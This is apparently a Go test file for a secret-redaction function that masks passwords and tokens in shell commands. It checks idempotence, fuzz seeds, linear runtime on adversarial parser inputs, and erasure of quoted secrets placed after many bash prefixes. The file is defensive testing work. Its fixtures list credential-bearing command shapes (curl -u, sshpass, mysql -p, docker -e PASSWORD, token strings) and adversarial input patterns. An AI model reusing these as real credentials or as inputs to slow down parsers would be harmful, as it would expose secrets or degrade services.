		{`echo 'password=<redacted>RealSecret'`, `echo 'password=<redacted>'`},
		{`password=<redacted>RealSecret make`, `password=<redacted> make`},
		// 后面是空白、引号、结尾时只认占位符本身，结果不变
		{"cat <<'EOF'\npassword=<redacted> x\nEOF", "cat <<'EOF'\npassword=<redacted> x\nEOF"},
		{`mysql -p<redacted> -pX app`, `mysql -p<redacted> -pX app`},
	} {
		if got := String(c.in); got != c.want {
			t.Errorf("String(%q)\n 得到 %q\n 想要 %q", c.in, got, c.want)
		}
	}
}

// corpusInputs 汇总包里所有命令行语境的用例输入：幂等性质测试与模糊测试的种子都从这里取。
func corpusInputs() []string {
	var ins []string
	for _, c := range append(append([]shellCase{}, reviewCases...), round2Cases...) {
		ins = append(ins, c.in)
	}
	ins = append(ins, stringCorpus...)
	ins = append(ins, adversarialShapes(4<<10)...)
	return ins
}

// hub 收到守护进程已脱敏的载荷后会再跑一次脱敏，手机上看到的是第二次的结果：String(String(x)) 必须等于 String(x)。
func TestStringIdempotentOverCorpus(t *testing.T) {
	for _, in := range corpusInputs() {
		once := String(in)
		if twice := String(once); twice != once {
			t.Errorf("String 不幂等:\n 输入 %q\n 一次 %q\n 两次 %q", in, once, twice)
		}
	}
}

func FuzzString(f *testing.F) {
	for _, in := range corpusInputs() {
		if len(in) <= 4<<10 {
			f.Add(in)
		}
	}
	f.Fuzz(func(t *testing.T, in string) {
		once := String(in)
		if twice := String(once); twice != once {
			t.Errorf("String 不幂等:\n 输入 %q\n 一次 %q\n 两次 %q", in, once, twice)
		}
	})
}

// adversarialShapes 是评审 I3 的对抗输入：单行很多 <<、(( 后跟很多 <<、大量引号、深层 $( 嵌套等，长度约 n 字节。
func adversarialShapes(n int) []string {
	return []string{
		"cat " + strings.Repeat("<<a ", n/4) + "\n",
		"(( " + strings.Repeat("x<<a ", n/5) + "\n",
		"cat " + strings.Repeat("<<a ", n/4),
		strings.Repeat("'a' ", n/4),
		strings.Repeat(`"a" `, n/4),
		strings.Repeat(`"`, n),
		strings.Repeat("# x\n", n/4),
		strings.Repeat("cat <<A\nx\nA\n", n/12),
		strings.Repeat("cat <<A <<B\n", n/12),
		strings.Repeat("$(", n/2),
		strings.Repeat("$(", n/4) + strings.Repeat(")", n/4),
		strings.Repeat(`"$(`, n/3),
		strings.Repeat("${", n/2),
		strings.Repeat("`", n),
		strings.Repeat(`\`, n),
		strings.Repeat(`bash -c "`, n/9),
		strings.Repeat(`bash -c '`, n/9),
		strings.Repeat(`eval \"`, n/7),
		"mysql " + strings.Repeat(`" -p" x `, n/8),
		"curl " + strings.Repeat(`" -u" a:b `, n/10),
		strings.Repeat("TOKEN=", n/6),
		strings.Repeat("TOKEN=a ", n/8),
		strings.Repeat("password=x;", n/11),
		strings.Repeat("'TOKEN=a' ", n/10),
		strings.Repeat("ghp_abcdefghijklmnopqrstuvwxyz0123 ", n/35),
		strings.Repeat("curl -u a:b ", n/12),
		"curl -u " + strings.Repeat(`a:'b'"c"`, n/8),
		strings.Repeat("curl -u a:'b ", n/13),
		"sshpass " + strings.Repeat("-v -P x ", n/8),
		"sshpass " + strings.Repeat("-P 'x ", n/7),
		strings.Repeat("sshpass -p ", n/11),
		strings.Repeat("sshpass -pa ", n/12),
		"sshpass" + strings.Repeat(" \\\n -v", n/6),
		strings.Repeat("sshpass -p \\\n", n/14),
		"curl " + strings.Repeat("\\\n -u ", n/7),
		strings.Repeat(`"TOKEN=" `, n/9),
		strings.Repeat("x", n-12) + "token=\"a\"",
		strings.Repeat("case a in a) ", n/13),
		strings.Repeat("$((", n/3),
		strings.Repeat("((", n/2),
		strings.Repeat("<redacted>", n/10),
		strings.Repeat("ssh h <<E\n", n/10),
		strings.Repeat("ssh h <<E\n\\x ", n/13),
		strings.Repeat("`a\\\\`", n/6),
		"echo `" + strings.Repeat("\\`", n/2),
		strings.Repeat("eval \"$(", n/8),
		strings.Repeat("X=(", n/3),
		strings.Repeat("\"$(case x) ", n/12),
	}
}

// 1 MiB（proto.MaxLine）的对抗输入要在线性时间内处理完。上限放得很宽，只拦平方级的退化（旧实现在 256 KiB 上已是 11 秒，
// 1 MiB 上是分钟级）；不带 -race 的实测耗时见 BenchmarkStringAdversarial。-race 慢一二十倍，改用 128 KiB，
// 平方级的实现在这个长度上同样远超上限。
func TestStringLinearOnAdversarialInput(t *testing.T) {
	if testing.Short() {
		t.Skip("short")
	}
	n := 1 << 20
	if raceEnabled {
		n = 128 << 10
	}
	for i, in := range adversarialShapes(n) {
		start := time.Now()
		_ = String(in)
		if d := time.Since(start); d > 10*time.Second {
			t.Errorf("对抗输入 #%d（%d 字节）耗时 %v", i, len(in), d)
		}
	}
}

func BenchmarkStringAdversarial(b *testing.B) {
	shapes := adversarialShapes(1 << 20)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, in := range shapes {
			_ = String(in)
		}
	}
}

// 引号里的强密码（含 ; | & ( ) 等）放在各种常见写法之后，都必须整段抹掉：前缀里的 $(…)、heredoc、注释、撇号、
// 交给解释器的参数都不能让后面的引号错位。前缀与后缀都是成对、能被 bash 正常解析的写法。
func TestStringQuotedSecretAfterPrefixes(t *testing.T) {
	prefixes := []string{
		"", "git commit -m \"$(cat <<'EOF'\nfix(x): it's done\nEOF\n)\" && ", "cd \"$(pwd)\" && ", "echo \"it's\" ; ",
		"ls # don't\n", "bash -c 'echo hi' && ", "cat <<EOF\nx'y\"z\nEOF\n", "x=$((1<<2)); ", "echo `date` ; ",
		"echo $'a\\'b' ; ", "echo \"a<<b\" ; ", "y=${x:-'}'} ; ", "echo \"$(echo ')')\" ; ", "case a in a) echo;; esac ; ",
		"echo \\\" ; ", "ssh h \"echo 'a'\" && ", "(( x <<= 2 )) ; ", "cat <<<\"$x\" ; ", "python3 -c 'print(1<<4)'\n",
		"echo \"((\" && cat <<E > n ; echo \"))\"\ndon't\nE\n",
	}
	secrets := []struct{ in, tail string }{
		{`docker run -e "POSTGRES_PASSWORD=Xy7&kP(2)q;Zz|Q" pg`, `kP(2)q`},
		{`echo 'SECRET_KEY=ab;cd|ef&gh' > .env`, `cd|ef`},
		{`export DB_PASSWORD="Xy7;kP|2q&(r)"`, `kP|2q`},
		{`curl -H "Authorization: Bearer abc&def;ghi" x`, `def;ghi`},
		{`npm login --password 'p;a|s&s(w)d'`, `a|s&s`},
		{`mysql -p"Xy7;kP|2q" app`, `kP|2q`},
		{`curl -u "alice:Xy7;kP|2q" x`, `kP|2q`},
		{"cat > .env <<'EOF'\nDB_PASSWORD=Xy7&kP(2)q;Zz|Q\nEOF", `kP(2)q`},
		{`bash -c 'docker run -e "PGPASSWORD=Xy7&kP(2)q;Zz" pg'`, `kP(2)q`},
		{`bash -c "PGPASSWORD=\"Xy7&kP(2)q;Zz\" psql"`, `kP(2)q`},
	}
	suffixes := []string{"", " && echo done", "\necho 'x' \"y\"", " # it's"}
	for _, p := range prefixes {
		for _, p2 := range prefixes {
			for _, s := range secrets {
				for _, suf := range suffixes {
					in := p + p2 + s.in + suf
					if out := String(in); strings.Contains(out, s.tail) {
						t.Errorf("漏出秘密 %q:\n 输入 %q\n 得到 %q", s.tail, in, out)
					}
				}
			}
		}
	}
}
